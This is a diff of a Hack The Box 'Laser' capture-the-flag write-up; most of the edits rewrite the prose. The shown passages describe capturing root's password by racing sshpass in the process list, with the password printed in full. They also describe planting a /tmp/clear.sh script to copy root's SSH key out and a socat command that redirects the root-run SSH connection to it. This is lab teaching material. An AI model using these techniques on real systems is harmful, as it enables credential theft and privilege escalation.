@@ -14,10 +14,6 @@ description: >-
 
 ## Useful Skills and Tools
 
-#### Useful thing 1
-
-* description with generic example
-
 #### Using socat to redirect traffic to a port
 
 * description with generic example
@@ -1288,7 +1284,7 @@ I checked for processes running that might give me an indication at what may hav
 sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz scp /opt/updates/files/jenkins-feed root@172.18.0.2:/root/feeds/
 ```
 
-the sshpass program is being used here to pass `root`'s password to secure copy in order to move some file `jenkins-feed` to a folder on the docker container
+the sshpass program is being used here to pass `root`'s password to SCP in order to move the file `jenkins-feed` to a folder on the docker container.  I opened the manpage for sshpass to see if I could learn any more about how it worked and what it was doing.
 
 > sshpass is a utility designed for running ssh using the mode referred to as "keyboard-interactive" password authentication, but in non-interactive mode.
 >
@@ -1307,9 +1303,9 @@ the sshpass program is being used here to pass `root`'s password to secure copy 
 >
 >   The  -p  option should be considered the least secure of all of sshpass's options.  **All system users can see the password in the command line with a simple "ps"  command.  Sshpass  makes  a minimal  attempt  to hide the password, but such attempts are doomed to create race conditions without actually solving the problem.** Users of sshpass are encouraged to use one of the  other password passing techniques, which are all more secure.
 
-From the manpage for `sshpass` I found information that points out that there is a vulnerability in the implementation of the `-p` option.  I tried searching on Google for more information about this race condition, but wasn't able to find anything related to exploiting this.  I decided to look around and see if the source code was available to see if I could determine what this race condition was caused by and if I could exploit it.  
+Essentially it seemed as if this program was written to bypass the security of SSH's "user presence" check when passing plaintext passwords.  From the manpage for `sshpass` I found information that points out that there is a vulnerability in the implementation of the `-p` option.  I tried searching on Google for more information about this race condition, but wasn't able to find anything related to exploiting this.  I decided to look around and see if the source code was available to see if I could determine what this race condition was caused by and if I could exploit it.  
 
-code for sshpass: [https://github.com/kevinburke/sshpass/blob/master/main.c](https://github.com/kevinburke/sshpass/blob/master/main.c)
+I found the code for sshpass on GitHub: [https://github.com/kevinburke/sshpass/blob/master/main.c](https://github.com/kevinburke/sshpass/blob/master/main.c)
 
 ![](../../.gitbook/assets/8-sshpass-code.png)
 
@@ -1404,7 +1400,7 @@ static int parse_options( int argc, char *argv[] )
 }
 ```
 
-the `-p` option takes in the original password from argument input and obfuscates it by replacing each character with a 'z', one character at a time. In the `ps aux` output I got earlier I saw the command `sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz`
+After analyzing the source code, I found out that the `-p` option takes in the original password from argument input and obfuscates it by replacing each character with a 'z', one character at a time. In the `ps aux` output I got earlier I saw the command `sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz` followed by the SCP command the password was being supplied to.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
@@ -1412,7 +1408,7 @@ the `-p` option takes in the original password from argument input and obfuscate
 32
 ```
 
-The password was 32 characters long
+I copied the string of 'z's from the output to check its length.  The password was 32 characters long.  I tried logging in with `passwordpasswordpassword` but no luck...
 
 ### Getting root's password
 
@@ -1447,7 +1443,7 @@ After waiting for quite some time, I got what I wanted. Cleaning up the output m
 sshpass -p c413d115b3d87664499624e7826d8c5a scp /opt/updates/files/bug-feed root@172.18.0.2:/root/feeds/
 ```
 
-The password was `c413d115b3d87664499624e7826d8c5a`
+The password was `c413d115b3d87664499624e7826d8c5a`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/laser]
@@ -1455,7 +1451,7 @@ The password was `c413d115b3d87664499624e7826d8c5a`
 32
 ```
 
-verified the length
+I verified the length of the password I found to make sure that it matched what I found earlier.
 
 ### Getting a root shell \(on the container\)
 
@@ -1518,18 +1514,20 @@ docker
 
 so I copied the file to /tmp instead
 
+### clear.sh
+
 ```text
 'sshpass\x00-p\x00zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz\x00ssh\x00root@172.18.0.2\x00/tmp/clear.sh\x00'
 ```
 
-I noticed another process being run by `sshpass` was executing a script `clear.sh` in the tmp directory
+While running my python script to find the password \(before I put the check for zzz's\) I noticed another process being run by `sshpass` and was executing a script `clear.sh` in the `/tmp` directory.
 
 ```text
 solr@laser:/tmp$ vim /tmp/clear.sh
 solr@laser:/tmp$ chmod +x /tmp/clear.sh
 ```
 
-I made a script to copy roots SSH key to my machine so the script would run it
+I checked the `/tmp` directory to see what this script did, but there was no script there.  I made a script to copy `root`'s SSH key to my machine so the script would run it, since the process was running in the context of root \(verified by checking `ps aux` again\).  
 
 ```bash
 #! /bin/bash
@@ -1541,7 +1539,7 @@ My bash script was very simple, and just copied `root`'s SSH to my machine using
 
 Since the process that was running the `clear.sh` script on the machine was owned by root, and since it was trying to run by connecting to port 22 on the container, I figured I needed a way to redirect that connection back to the local machine since there was no script named `clear.sh` there in the `/tmp` directory. This would give me the perfect opportunity to supply one for them for my own purposes.  After doing some research on how to redirect ports without using SSH, I found the easiest way was by using `socat`.  
 
-[https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https](https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https)
+* [https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https](https://stackoverflow.com/questions/34791674/socat-port-forwarding-for-https)
 
 ```text
 root@20e3289bc183:/tmp# ./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
@@ -1707,7 +1705,7 @@ In the root directory I also found the scripts that explained how this machine w
 
 ![](../../.gitbook/assets/0-laser-pwned.png)
 
-Thanks to [`MrR3boot`](https://app.hackthebox.eu/users/13531) & [`R4J`](https://app.hackthebox.eu/users/13243) for... something interesting or useful about this machine.
+Thanks to [`MrR3boot`](https://app.hackthebox.eu/users/13531) & [`R4J`](https://app.hackthebox.eu/users/13243) for creating such a fun and interesting test of my python abilities.  I think this is the first time that I have had to write so many scripts for just one machine.  It was nice to learn about some new protocols, and also work in some API interaction as well.  
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
 
